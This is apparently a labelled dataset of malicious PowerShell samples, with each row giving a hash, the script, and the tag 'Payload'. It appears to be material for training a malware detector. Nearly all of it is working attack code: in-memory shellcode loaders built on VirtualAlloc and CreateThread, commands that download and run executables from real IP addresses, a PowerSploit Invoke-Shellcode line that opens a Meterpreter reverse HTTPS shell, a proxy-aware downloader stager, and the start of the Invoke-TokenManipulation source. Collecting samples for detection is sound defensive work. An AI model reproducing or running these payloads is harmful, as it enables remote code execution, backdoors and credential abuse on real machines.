0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
487480366a12e07d680f187033326fcfbc0eea35e86a91586ce8052b79a9d041,"
$oT20 = '$mgi = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $mgi -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xf1,0xf5,0xe8,0x9a,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x57,0x31,0x70,0x12,0x03,0x70,0x12,0x83,0x31,0xf1,0x0a,0x6f,0x4d,0x12,0x48,0x90,0xad,0xe3,0x2d,0x18,0x48,0xd2,0x6d,0x7e,0x19,0x45,0x5e,0xf4,0x4f,0x6a,0x15,0x58,0x7b,0xf9,0x5b,0x75,0x8c,0x4a,0xd1,0xa3,0xa3,0x4b,0x4a,0x97,0xa2,0xcf,0x91,0xc4,0x04,0xf1,0x59,0x19,0x45,0x36,0x87,0xd0,0x17,0xef,0xc3,0x47,0x87,0x84,0x9e,0x5b,0x2c,0xd6,0x0f,0xdc,0xd1,0xaf,0x2e,0xcd,0x44,0xbb,0x68,0xcd,0x67,0x68,0x01,0x44,0x7f,0x6d,0x2c,0x1e,0xf4,0x45,0xda,0xa1,0xdc,0x97,0x23,0x0d,0x21,0x18,0xd6,0x4f,0x66,0x9f,0x09,0x3a,0x9e,0xe3,0xb4,0x3d,0x65,0x99,0x62,0xcb,0x7d,0x39,0xe0,0x6b,0x59,0xbb,0x25,0xed,0x2a,0xb7,0x82,0x79,0x74,0xd4,0x15,0xad,0x0f,0xe0,0x9e,0x50,0xdf,0x60,0xe4,0x76,0xfb,0x29,0xbe,0x17,0x5a,0x94,0x11,0x27,0xbc,0x77,0xcd,0x8d,0xb7,0x9a,0x1a,0xbc,0x9a,0xf2,0xb2,0xda,0x50,0x03,0x23,0x52,0xf1,0x6d,0xda,0xc8,0x69,0x3e,0x6b,0xd7,0x6e,0x41,0x46,0x26,0xab,0xee,0x3a,0x1a,0x18,0x42,0xd5,0xa6,0xc8,0x1d,0x82,0x28,0x21,0x8e,0x9f,0xbc,0xca,0x62,0x73,0x29,0xbc,0x93,0x73,0xa9,0xd4,0x10,0x73,0xa9,0x24,0x06,0x38,0xf0,0x6a,0x69,0xf8,0x02,0x22,0xe1,0xaf,0x8b,0x5d,0x37,0xb0,0x59,0xe8,0x7e,0x1c,0x0a,0xea,0x4c,0x43,0x4e,0xb9,0xe3,0xd0,0x18,0x6e,0x52,0xbf,0x4d,0xc5,0x74,0x04,0x6d,0x30,0x1e,0x10,0x9b,0xe5,0x77,0x65,0xa8,0x19,0x88,0xec,0x2f,0x73,0x8c,0xbe,0xc5,0x9c,0xda,0x56,0x6f,0xe4,0x7c,0x20,0x70,0x3d,0xd3,0x7e,0xdc,0xee,0x82,0xe8,0xcf,0x16,0x33,0x92,0xf0,0xc3,0xc6,0xa4,0x7a,0xe1,0x87,0x51,0x5c,0x9d,0xe7,0x2f,0xfc,0x0b,0xf7,0x85,0x6b,0xf3,0x6f,0x26,0x7c,0xf3,0x6f,0x4e,0x7c,0xf3,0x2f,0x8e,0x2f,0x9b,0xf7,0x2a,0x9c,0xbe,0xf7,0xe6,0xb0,0x13,0x5b,0x80,0x50,0xc4,0x33,0x92,0xbe,0xea,0xc3,0xc1,0xe8,0x82,0xd1,0x73,0x9d,0xb0,0x29,0xae,0x1b,0xf4,0xa2,0x9c,0xaf,0xf3,0x4b,0xdc,0x35,0x3b,0x3e,0x07,0x6d,0x78,0x9e,0x2f,0xfb,0x81,0xde,0x4f,0x35,0x44,0x13,0x9e,0x07,0x80,0x6b,0xf0,0x57,0xc2,0xba,0x3f,0x98;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$o8Y=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($o8Y.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$o8Y,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($oT20));$WUNH = ""-e "";if([IntPtr]::Size -eq 8){$YIr = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $YIr $WUNH $e""}else{;iex ""& powershell $WUNH $e"";}

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
5527ce6c4dfccf8a9ec5a911c2c90cec87747fb64efb3a636f6a5c82e01adbda,"
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter/reverse_https  Lhost 198.56.248.117  Lport 443  Force

",Payload
445a4e81ad763a4fa2ed1f6744b2028358ff8d70945433659a9bcad5dc0cb640,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
33b02ce9c12c837c63aa005ea8d516d840df90f0e01a076d483d2baf2ab4c7a3,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.58.30/~trevor/winx64.exe',""$env:APPDATA\winx64.exe"");Start-Process (""$env:APPDATA\winx64.exe"")

",Payload
683e657cbcf0eaf880aca75be5188c65cb21bd9a03361aae2912a5180538a480,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x67,0xec,0x08,0x68,0x02,0x00,0x04,0x62,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
4af7562b8ca6f68be6a55c4070fc4746727991c61f81392cc3bb52990d80c5c1,"
$wc=New-ObjEct SySTEM.NET.WebClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEadeRS.AdD('User-Agent',$u);$Wc.PrOxY = [SYsTEM.NeT.WeBREqUeST]::DeFaulTWEBPROXy;$wC.ProXY.CrEDeNtiaLS = [SyStEm.Net.CREDentIalCAChE]::DefAULtNetwoRkCREdenTiAlS;$K='/j(\wly4+aW

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
4aecb6af96e94d2397c7a3f568bb592c65d6980839ac8841c67baa856711c2d9,"function Invoke-TokenManipulation
{


    [CmdletBinding(DefaultParameterSetName=""Enumerate"")]
    Param(
        [Parameter(ParameterSetName = ""Enumerate"")]
        [Switch]
        $Enumerate,

        [Parameter(ParameterSetName = ""RevToSelf"")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = ""ShowAll"")]
        [Switch]
        $ShowAll,

        [Parameter(ParameterSetName = ""ImpersonateUser"")]
        [Switch]
        $ImpersonateUser,

        [Parameter(ParameterSetName = ""CreateProcess"")]
        [String]
        $CreateProcess,

        [Parameter(ParameterSetName = ""WhoAmI"")]
        [Switch]
        $WhoAmI,

        [Parameter(ParameterSetName = ""ImpersonateUser"")]
        [Parameter(ParameterSetName = ""CreateProcess"")]
        [String]
        $Username,

        [Parameter(ParameterSetName = ""ImpersonateUser"")]
        [Parameter(ParameterSetName = ""CreateProcess"")]
        [Int]
        $ProcessId,

        [Parameter(ParameterSetName = ""ImpersonateUser"", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = ""CreateProcess"", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(ParameterSetName = ""ImpersonateUser"")]
        [Parameter(ParameterSetName = ""CreateProcess"")]
        $ThreadId,

        [Parameter(ParameterSetName = ""CreateProcess"")]
        [String]
        $ProcessArgs,

        [Parameter(ParameterSetName = ""CreateProcess"")]
        [Switch]
        $NoUI,

        [Parameter(ParameterSetName = ""CreateProcess"")]
        [Switch]
        $PassThru
    )
   
    Set-StrictMode -Version 2

	
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    
    
    
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    


    
    
    
	
	
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    
	$TypeBuilder = $ModuleBuilder.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
	$TypeBuilder.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroups', [UInt32] 2) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrivileges', [UInt32] 3) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOwner', [UInt32] 4) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrimaryGroup', [UInt32] 5) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDefaultDacl', [UInt32] 6) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSource', [UInt32] 7) | Out-Null
    $TypeBuilder.DefineLiteral('TokenType', [UInt32] 8) | Out-Null
    $TypeBuilder.DefineLiteral('TokenImpersonationLevel', [UInt32] 9) | Out-Null
    $TypeBuilder.DefineLiteral('TokenStatistics', [UInt32] 10) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedSids', [UInt32] 11) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionId', [UInt32] 12) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroupsAndPrivileges', [UInt32] 13) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSessionReference', [UInt32] 14) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSandBoxInert', [UInt32] 15) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAuditPolicy', [UInt32] 16) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOrigin', [UInt32] 17) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevationType', [UInt32] 18) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLinkedToken', [UInt32] 19) | Out-Null
    $TypeBuilder.DefineLiteral('TokenElevation', [UInt32] 20) | Out-Null
    $TypeBuilder.DefineLiteral('TokenHasRestrictions', [UInt32] 21) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAccessInformation', [UInt32] 22) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationAllowed', [UInt32] 23) | Out-Null
    $TypeBuilder.DefineLiteral('TokenVirtualizationEnabled', [UInt32] 24) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIntegrityLevel', [UInt32] 25) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUIAccess', [UInt32] 26) | Out-Null
    $TypeBuilder.DefineLiteral('TokenMandatoryPolicy', [UInt32] 27) | Out-Null
    $TypeBuilder.DefineLiteral('TokenLogonSid', [UInt32] 28) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsAppContainer', [UInt32] 29) | Out-Null
    $TypeBuilder.DefineLiteral('TokenCapabilities', [UInt32] 30) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerSid', [UInt32] 31) | Out-Null
    $TypeBuilder.DefineLiteral('TokenAppContainerNumber', [UInt32] 32) | Out-Null
    $TypeBuilder.DefineLiteral('TokenUserClaimAttributes', [UInt32] 33) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceClaimAttributes', [UInt32] 34) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedUserClaimAttributes', [UInt32] 35) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceClaimAttributes', [UInt32] 36) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDeviceGroups', [UInt32] 37) | Out-Null
    $TypeBuilder.DefineLiteral('TokenRestrictedDeviceGroups', [UInt32] 38) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSecurityAttributes', [UInt32] 39) | Out-Null
    $TypeBuilder.DefineLiteral('TokenIsRestricted', [UInt32] 40) | Out-Null
    $TypeBuilder.DefineLiteral('MaxTokenInfoClass', [UInt32] 41) | Out-Null
	$TOKEN_INFORMATION_CLASS = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LARGE_INTEGER', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
	$LARGE_INTEGER = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
	$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
	$TypeBuilder.DefineField('HighPart', [Int32], 'Public') | Out-Null
	$LUID = $TypeBuilder.CreateType()

    
    $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
	$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_STATISTICS', $Attributes, [System.ValueType])
	$TypeBuilder.DefineField('TokenId', $LUID, 'Public') | Out-Null
	$TypeBuilder.DefineField('AuthenticationId', $LUID, 'Public') | Out-Null
    $TypeBuilder.DefineField('ExpirationTime', $LARGE_INTEGER, 'Public') | Out-Null
    $TypeBuilder.DefineField('TokenType', [UInt32], 'Public') | Out-Null
    $TypeBuilder.DefineField('ImpersonationLevel', [UInt32], 'Public') | Out-Null
